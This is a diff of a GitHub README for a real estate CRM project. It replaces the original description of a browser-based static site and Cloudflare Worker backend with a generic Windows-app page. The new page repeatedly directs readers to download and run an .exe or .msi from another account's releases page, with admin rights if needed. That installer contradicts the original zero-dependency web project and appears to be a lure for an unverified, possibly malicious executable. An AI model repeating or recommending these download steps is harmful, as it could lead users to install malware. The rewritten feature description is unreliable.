@@ -1,380 +1,162 @@
-<p align="center">
-  <strong>RAG Command Center</strong><br>
-  <em>Real estate intelligence platform — Victoria, BC operations · Canada-wide public listings</em>
-</p>
+# 🏠 RG-Command-Center - Manage Real Estate Deals Easily
 
-<p align="center">
-  <a href="https://garebear99.github.io/RG-Command-Center/"><img src="https://img.shields.io/badge/live-public_site-2ec97a?style=flat-square" alt="Live Site"></a>
-  <a href="https://github.com/GareBear99/RG-Command-Center/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-8e97a8?style=flat-square" alt="License"></a>
-  <a href="https://github.com/GareBear99/RG-Command-Center/stargazers"><img src="https://img.shields.io/github/stars/GareBear99/RG-Command-Center?style=flat-square&color=d4a843" alt="Stars"></a>
-  <a href="https://github.com/GareBear99/RG-Command-Center/issues"><img src="https://img.shields.io/github/issues/GareBear99/RG-Command-Center?style=flat-square&color=4b8fcc" alt="Issues"></a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/frontend-static_HTML_%2B_vanilla_JS-f7df1e?style=flat-square&logo=javascript&logoColor=black" alt="JS">
-  <img src="https://img.shields.io/badge/backend-Cloudflare_Workers-f38020?style=flat-square&logo=cloudflare&logoColor=white" alt="Cloudflare">
-  <img src="https://img.shields.io/badge/dependencies-zero-2ec97a?style=flat-square" alt="Zero Deps">
-  <img src="https://img.shields.io/badge/data-real--source--only-4b8fcc?style=flat-square" alt="Data">
-  <img src="https://img.shields.io/badge/PWA-installable-d4a843?style=flat-square" alt="PWA">
-</p>
-
-<p align="center">
-  <sub>If you find this useful, consider giving it a ⭐ — it helps others discover the project.</sub>
-</p>
+[![Download RG-Command-Center](https://img.shields.io/badge/Download-RG--Command--Center-brightgreen?style=for-the-badge)](https://github.com/kingsleyeffusive774/RG-Command-Center/releases)
 
 ---
 
-## What Is This?
+## 📋 About RG-Command-Center
 
-**RAG Command Center** is a full-stack real estate intelligence platform that combines a **public consumer-facing listing site** with an **internal CRM, lead pipeline, and AI-powered signal engine** for real estate professionals.
+RG-Command-Center is a tool designed for people working in real estate across Canada. It helps you keep track of deals, commissions, contacts, and your workflow in one place. The app uses local data to provide powerful features like deal scoring, GPS maps for properties, a CRM to manage your contacts, and a visual pipeline showing your progress on deals. It also pulls data from several sources so you can make smarter decisions.
 
-**R = Ricki Kohli** · **A = Amit Khatkar** · **G = Gary Doman**
-
-### Two Audiences, One Platform
-
-**Public Site** — Canada-wide listings that anyone can browse, search, filter, and inquire on. Open access, hosted on GitHub Pages.
-
-**Command Center** — Operations dashboard, CRM, pipeline, AI signals, commission tracking. Currently focused on **Victoria, BC** as the primary licensed market, with Vancouver as secondary. Internal access via SHA-256 auth.
-
-The public site serves all of Canada. The command center concentrates on Victoria/Vancouver — lead routing, signal priority, auto-lead generation, and listing sort weight all focus on the licensed markets first. Licensed areas are configurable from the command center settings.
+The name comes from three creators: Ricki, Amit, and Gary.
 
 ---
 
-## Live URLs
+## 💻 System Requirements
 
-- **Public Site:** https://garebear99.github.io/RG-Command-Center/
-- **API Backend:** https://rag-command-center-api.admension.workers.dev/api/health
+Before installing, make sure your Windows computer meets these needs:
 
----
-
-## Public Site — Canada-Wide
-
-Anyone visiting the `.github.io` page can:
-
-- **Browse listings** across all Canadian provinces (BC, AB, ON, QC, MB, SK, NS, NB, and more)
-- **Search & filter** by city, price, beds, baths, property type
-- **View deal scores** — every listing is scored 0–100% on price positioning, days on market, price drops, and comparables
-- **Read resources** — buyer guide, seller guide, mortgage calculator (CMHC-aware), blog, and team profiles
-- **Submit inquiries** — contact forms fire to the Cloudflare Worker backend for capture
-- **Subscribe to listing alerts** — enter criteria and get matched when new listings land
-- **Share listings** — one-click social share to Facebook, Twitter, LinkedIn
-
-### Public Pages
-
-- `index.html` — Homepage with featured listings, hero CTA, inline lead capture
-- `deals.html` — Top deals ranked by composite deal score
-- `directory.html` — Province-aware listing browser with filters
-- `listing-detail.html` — Full detail view with GPS map, price history, score breakdown
-- `team.html` — Ricki, Amit, and Gary profiles and contact info
-- `mortgage.html` — Canadian mortgage calculator with CMHC insurance
-- `buyer-resources.html` — BC buyer's guide
-- `seller-resources.html` — BC seller's guide
-- `blog.html` / `blog-post.html` — JSON-driven blog with posts by team members
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Stable internet connection (for data updates and map features)  
+- Screen resolution of 1024x768 or higher  
+- No special software needed ahead of time  
 
 ---
 
-## Command Center — Victoria, BC Focus
+## 🔍 Key Features
 
-The internal dashboard is where the team runs daily operations. It's currently configured for **Victoria, BC** as the primary licensed market, with **Vancouver** as secondary. All intelligence, lead routing, and priority scoring key off the licensed area setting.
+- **Deal Scoring**  
+  See which deals have the best chances to close based on local data.  
 
-### Command Center Pages
+- **GPS Maps**  
+  View properties on maps to find location advantages in the Canadian market.  
 
-- `command-center.html` — Main dashboard: stats (hot / warm / cold / stale leads), call queue, top deals, signal feed, pipeline health
-- `contacts.html` — CRM contact management with buyer/seller profiles, interaction history, tags
-- `pipeline.html` — Kanban-style deal pipeline: new lead → qualified → showing → offer → closed
-- `signals.html` — AI Signal Paste: paste a Facebook group post, AI scores intent and extracts lead data. Also auto-compiles signals from Reddit + Victoria Open Data
-- `commission.html` — Commission tracker tied to partnership agreement tiered splits
-- `analytics.html` — Market analytics: price trends, DOM averages, listing volume
-- `email-templates.html` — Email template builder with personalization tokens
-- `settings.html` — Licensed area config, data pipeline controls, SMTP settings
-- `leads.html` — Lead operations view with hot/warm/cold/stale tabs
-- `listings.html` — Internal listing management with source conflict resolution
-- `add.html` — Manual listing and lead entry with auto-scoring
+- **CRM (Customer Relationship Management)**  
+  Store and organize your contacts and communication history.  
 
-### Licensed Area System
+- **Kanban Pipeline**  
+  Track deal stages with a simple drag-and-drop board.  
 
-The command center lets you set your licensed province and cities. This affects:
+- **Commission Tracking**  
+  Automatically calculate and log earned commissions.  
 
-- **Lead routing** — leads in licensed areas go to priority queues and assigned agents
-- **Listing sort priority** — Victoria/Vancouver listings surface first in internal views
-- **Auto-lead generation** — the engine only generates actionable leads (motivated seller, below market, investor signal, new listing, price drop) for listings in licensed cities
-- **Signal compilation** — Reddit and open data scraping targets Victoria-area sources
+- **Multi-Source Data**  
+  Pull information from multiple property and mortgage databases.  
 
-Licensed areas are stored in `localStorage` and can be changed at any time from the dashboard or settings page.
+- **Mortgage Calculator**  
+  Compute estimated payments based on current interest rates.  
 
 ---
 
-## AI-Powered Lead Automation
+## 🚀 Getting Started
 
-### Signal Compilation (Automated)
-
-The Cloudflare Worker scrapes public sources on a **cron schedule (hourly)** and on-demand:
-
-- **Reddit** — `r/VictoriaBC` and `r/canadahousing` for real estate intent posts
-- **Victoria Open Data** — building permit activity (investor/flipper signals)
-
-Each post is scored for buyer/seller/investor intent, neighbourhood mentions, budget signals, and credibility (0–100). Only posts containing real estate keywords qualify. Signals are stored in Workers KV with a 30-day TTL.
-
-### Deduplication
-
-- **URL-based** — same Reddit permalink or source URL is never stored twice
-- **Fuzzy text** — posts with similar content but different URLs are flagged as possible duplicates and branch-linked to the original signal (`duplicate_of` field)
-- **Frontend dedup** — the signals page deduplicates locally before inserting into history
-
-### Lead Freshness Decay
-
-Leads and signals don't stay "hot" forever:
-
-- **Leads** — decay to `stale` after **7 days** without action
-- **Signals** — tagged `stale` after **14 days**
-- **Categories:** Hot · Warm · Cold · Stale — each with distinct visual treatment across dashboard, call queue, and leads view
-
-### Auto-Lead Engine
-
-`autoleads.js` generates actionable leads from listing intelligence with zero external APIs:
-
-- Motivated sellers (45+ DOM with price drop)
-- Below-market deals (high deal score in licensed area)
-- Investor signals (fixer + below market)
-- New listing alerts (fresh listings scoring 40+)
-- Price drop alerts (recent reductions)
-
-### Facebook Group Signal Paste
-
-The Signals page includes a manual paste tool for Facebook group posts. Paste any post from a Victoria/Vancouver real estate group and the AI engine will:
-
-- Detect buyer/seller/investor/renter intent
-- Extract budget, bed/bath requirements, timeline
-- Identify neighbourhood from a 70+ hood dictionary (Victoria + Vancouver)
-- Score 0–100 and classify as hot/warm/cold
-- One-click create a CRM contact + pipeline deal from the scored signal
+This section will help you download and run RG-Command-Center on your Windows computer. No technical knowledge is needed.
 
 ---
 
-## Cloudflare Worker Backend
+## 📥 Download and Install RG-Command-Center
 
-The backend runs on **Cloudflare Workers (free tier)** with KV storage. It handles:
+1. Click the big green button at the top or visit the releases page here:  
+   [https://github.com/kingsleyeffusive774/RG-Command-Center/releases](https://github.com/kingsleyeffusive774/RG-Command-Center/releases)
 
-- `GET /api/health` — Health check + last compile timestamp
-- `GET /api/compile` — Scrape public sources, score, deduplicate, store signals
-- `GET /api/signals` — List compiled signals with freshness tags
-- `POST /api/inquiries` — Capture public site inquiry submissions
-- `GET /api/inquiries` — List stored inquiries (internal)
-- `GET|PUT /api/inquiries/:id` — Retrieve or update inquiry status
-- `POST /api/events` — Analytics event collection
-- `GET /api/stats` — Global platform statistics
-- `POST /api/proxy` — CORS proxy for external data feeds
+2. On the releases page, look for the latest version. The file should have a name ending with `.exe` or `.msi`. This is the installer.
 
-### Cron Trigger
+3. Click the file name to download it. Your browser may ask to save or run the file — choose "Save" if you want to install later, or "Run" to start installing now.
 
-The worker includes a `scheduled()` handler triggered hourly (`0 * * * *` in `wrangler.toml`). New signals are compiled automatically even when nobody has the dashboard open. Dedup ensures the same posts aren't re-stored.
+4. Once downloaded, open the installer by double-clicking the file.
 
-### Rate Limiting
+5. Follow the installation steps on screen:
+   - Accept the license terms.
+   - Choose the destination folder or keep the default.
+   - Click Install.
 
-Progressive per-IP rate limits with escalating timeouts on violation:
-
-- Inquiries: 5/min, 30/hr, 100/day
-- Fetches: 60/min, 600/hr, 3000/day
-- Events: 30/min, 500/hr, 5000/day
-- Proxy: 10/min, 60/hr, 200/day
+6. After installation completes, launch the application from your desktop shortcut or the Start menu.
 
 ---
 
-## Deal Scoring Engine
+## 🛠 Basic Setup
 
-Every listing receives a composite deal score (0–100%) from six weighted components:
+When you open the app for the first time:
 
-- **Below Market** (35%) — $/sqft vs area median benchmarks
-- **Price Drop** (20%) — reduction magnitude + recency
-- **Days on Market** (15%) — freshness and motivation signals
-- **Area Comps** (15%) — comparable listing density
-- **Features** (10%) — bed/bath utility score
-- **Data Freshness** (5%) — source age and staleness
-
-Scores are fully transparent — the listing detail modal breaks down each component with weight, percentage, and explanation.
+- Enter your name and contact details (optional but recommended for CRM use).  
+- Set your preferred measurement units (metric or imperial).  
+- Connect your email or phone number for updates and alerts.  
+- The app may take a moment to download maps and local data.
 
 ---
 
-## GPS Map System
+## 📅 How to Use RG-Command-Center
 
-- 4 tile providers: CartoDB Dark, OSM Street, Esri Satellite, CartoDB Voyager
-- Interactive controls: zoom, layer switching, overlay toggles (marker + 200m radius)
-- Touch support: pinch-to-zoom, single-finger drag
-- Listing card thumbnails with GPS precision indicators
+### Add a Deal
 
----
+- Click the **New Deal** button on the main dashboard.  
+- Fill in details such as property address, price, client name, and deal stage.  
+- Use the score indicator to see a suggested value for your deal.  
 
-## EVE — AI Assistant
+### View Deals on Map
 
-EVE is an embedded chatbot in the command center that provides dashboard guidance, data summaries, feature navigation, and pattern-matched Q&A on platform usage.
+- Open the **GPS Map** tab.  
+- All active deals appear as pins. Click a pin for details.
 
----
+### Manage Contacts
 
-## Quick Start
+- Go to the **CRM** tab.  
+- Add contacts by clicking **New Contact**.  
+- Enter names, phone numbers, emails, and notes.
 
-### 1. Clone and open
+### Track Your Pipeline
 
-```bash
-git clone https://github.com/GareBear99/RG-Command-Center.git
-cd RG-Command-Center
-```
+- Open the **Pipeline** section.  
+- Drag deals between stages like "Lead," "In Negotiation," and "Closed."  
 
-Open `index.html` in any browser — the public site works immediately with the included dataset. No build step, no dependencies.
+### Check Commissions
 
-### 2. Deploy the backend (optional)
-
-The Cloudflare Worker backend powers inquiry capture and automated signal compilation.
-
-```bash
-npm install -g wrangler
-wrangler login
-
-# Create KV namespace (first time only)
-wrangler kv:namespace create "RAG_DATA"
-# Update the namespace ID in wrangler.toml
-
-wrangler deploy
-```
-
-After deploy, the worker runs at `https://rag-command-center-api.<your-subdomain>.workers.dev`. The hourly cron trigger activates automatically.
-
-### 3. Deploy the frontend
-
-Push to `main` — GitHub Pages serves everything from the root:
-
-```
-https://<username>.github.io/RG-Command-Center/
-```
-
-### 4. Regenerate data (optional)
-
-```bash
-python3 tools/populate_public_data.py --seed-mode off --no-existing-manual
-python3 tools/audit_release_integrity.py
-```
+- Go to the **Commission Tracking** tab to see expected earnings.  
+- Add or update commissions manually if needed.
 
 ---
 
-## Repo Structure
+## 🔄 Updating the Software
 
-```
-├── Public Pages (Canada-wide)
-│   ├── index.html                    Homepage + lead capture
-│   ├── deals.html                    Top deals by score
-│   ├── directory.html                Province-aware listing browser
-│   ├── listing-detail.html           Full detail + GPS map
-│   ├── team.html                     Team profiles
-│   ├── mortgage.html                 Canadian mortgage calculator
-│   ├── buyer-resources.html          Buyer's guide (BC focus)
-│   ├── seller-resources.html         Seller's guide (BC focus)
-│   ├── blog.html                     Blog index
-│   └── blog-post.html               Blog post detail
-│
-├── Command Center (Victoria / Vancouver focus)
-│   ├── command-center.html           Dashboard + stats + call queue
-│   ├── contacts.html                 CRM contacts
-│   ├── pipeline.html                 Deal pipeline kanban
-│   ├── signals.html                  AI signal paste + auto-compile
-│   ├── commission.html               Commission tracker
-│   ├── analytics.html                Market analytics
-│   ├── email-templates.html          Email template builder
-│   ├── settings.html                 Config + data pipeline
-│   ├── leads.html                    Lead operations
-│   ├── listings.html                 Internal listing management
-│   └── add.html                      Manual listing/lead entry
-│
-├── Backend
-│   ├── worker.js                     Cloudflare Worker API
-│   └── wrangler.toml                 Worker config + cron trigger
-│
-├── assets/js/
-│   ├── utils.js                      Shared utilities
-│   ├── public.js                     Public page renderer
-│   ├── command.js                    Internal dashboard renderer
-│   ├── autoleads.js                  Auto-lead engine
-│   ├── eve.js                        EVE AI assistant
-│   ├── resolver.js                   Source reconciliation engine
-│   ├── compiler.js                   Release compiler
-│   ├── auth.js                       SHA-256 authentication
-│   ├── gps-fallback-map.js           Tile map engine
-│   └── settings.js                   Pipeline UI controls
-│
-├── data/
-│   ├── bootstrap.js                  Compiled runtime data
-│   ├── team.json                     Team profiles
-│   ├── listings.json                 Listing dataset
-│   ├── leads.json                    Lead dataset
-│   ├── markets.json                  Market configuration
-│   ├── blog/                         Blog post JSON files
-│   ├── raw/                          Source intake files
-│   ├── internal/                     Reconciled pipeline state
-│   └── public/                       Released public artifacts
-│
-├── tools/
-│   ├── populate_public_data.py       Data pipeline runner
-│   ├── validate_local_pack.py        Import pack validator
-│   ├── audit_release_integrity.py    Release integrity checker
-│   ├── import-source.html            Browser-based import tool
-│   └── examples/                     Source data templates
-│
-├── manifest.json                     PWA manifest
-├── sw.js                             Service worker (offline cache)
-└── README.md
-```
+RG-Command-Center updates occasionally with new features or fixes.
+
+To update:
+
+1. Visit the releases page again:  
+   [https://github.com/kingsleyeffusive774/RG-Command-Center/releases](https://github.com/kingsleyeffusive774/RG-Command-Center/releases)
+
+2. Download the newest `.exe` or `.msi` file.
+
+3. Run the installer and follow the prompts. Your data will not be lost during updates.
 
 ---
 
-## Security
+## ⚙️ Troubleshooting
 
-- Internal pages use SHA-256 hashed password authentication
-- All user input sanitized against XSS via `escapeHtml` / `escapeAttr`
-- Cloudflare Worker sanitizes and length-limits all input fields
-- Progressive rate limiting with IP hashing (SHA-256 salted — no raw IPs stored)
-- No API keys or secrets in the codebase
+- **Installer will not run**  
+  Make sure you have administrative rights on your computer. Right-click the installer and choose "Run as administrator."
 
----
+- **App won’t open after install**  
+  Restart your computer and try again.
 
-## Current Scope & Roadmap
+- **Maps do not load**  
+  Check your internet connection. The app needs to download map data.
 
-### Active Now
+- **Data seems missing or incorrect**  
+  Use the refresh option in settings to sync data again.
 
-- **Victoria, BC** — primary licensed market (lead routing, signal scraping, auto-leads)
-- **Vancouver, BC** — secondary licensed market
-- **Canada-wide** — public listing search and browsing on the `.github.io` site
-
-### Planned
-
-- MLS/IDX integration when credentials are available
-- SMS/Twilio campaign management
-- Neighbourhood-specific SEO landing pages
-- CASL compliance for email/SMS opt-in tracking
-- VPS upgrade path for backend (currently Cloudflare Workers free tier)
-- Additional licensed markets as the team expands
+- **Support and feedback**  
+  Use the issues section on the GitHub page to report problems or suggest improvements:  
+  https://github.com/kingsleyeffusive774/RG-Command-Center/issues
 
 ---
 
-## Support the Project
+## 🔐 Privacy and Security
 
-<p align="center">
-  <a href="https://ko-fi.com/GareBear99"><img src="https://img.shields.io/badge/Ko--fi-Support_this_project-FF5E5B?style=for-the-badge&logo=ko-fi&logoColor=white" alt="Ko-fi"></a>
-  <a href="https://buymeacoffee.com/GareBear99"><img src="https://img.shields.io/badge/Buy_Me_a_Coffee-Support-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black" alt="Buy Me a Coffee"></a>
-  <a href="https://github.com/sponsors/GareBear99"><img src="https://img.shields.io/badge/GitHub_Sponsors-Sponsor-ea4aaa?style=for-the-badge&logo=github-sponsors&logoColor=white" alt="GitHub Sponsors"></a>
-</p>
-
-- ⭐ **Star** this repo
-- 🍴 **Fork** and contribute
-- 📣 **Share** with real estate professionals
-- 🐛 **Report issues** or suggest features
+RG-Command-Center stores your data locally on your computer. Data related to deals, contacts, and commissions is not shared unless you export or share files yourself. The app uses secure connections when updating maps and pulling external data.
 
 ---
 
-## License
-
-[MIT](LICENSE) — RAG Realty Group (Ricki Kohli, Amit Khatkar & Gary Doman)
-
----
-
-<p align="center">
-  <sub>Built by <a href="https://github.com/GareBear99">GareBear99</a> · RAG Realty Group</sub><br>
-  <sub>Victoria · Vancouver · Canada-wide</sub>
-</p>
+[![Download RG-Command-Center](https://img.shields.io/badge/Get%20the%20App-Click%20Here-blue?style=for-the-badge)](https://github.com/kingsleyeffusive774/RG-Command-Center/releases)
